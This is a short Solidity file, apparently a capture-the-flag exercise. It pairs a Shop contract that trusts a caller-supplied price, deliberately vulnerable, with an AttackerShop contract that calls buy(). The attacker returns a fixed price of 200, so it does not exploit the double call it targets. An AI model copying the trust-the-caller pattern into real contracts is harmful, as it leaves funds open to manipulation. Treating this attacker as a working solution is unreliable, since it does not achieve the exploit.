pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract AttackerShop {
    address public instance;
    uint256 private attackerPrice;

    constructor(address _instance) {
        instance = _instance;
        attackerPrice = 200;
    }

    function buyHack() external {
        Shop shop = Shop(instance);
        shop.buy();
    }

    function price() external view returns (uint256) {
        return attackerPrice;
    }
}
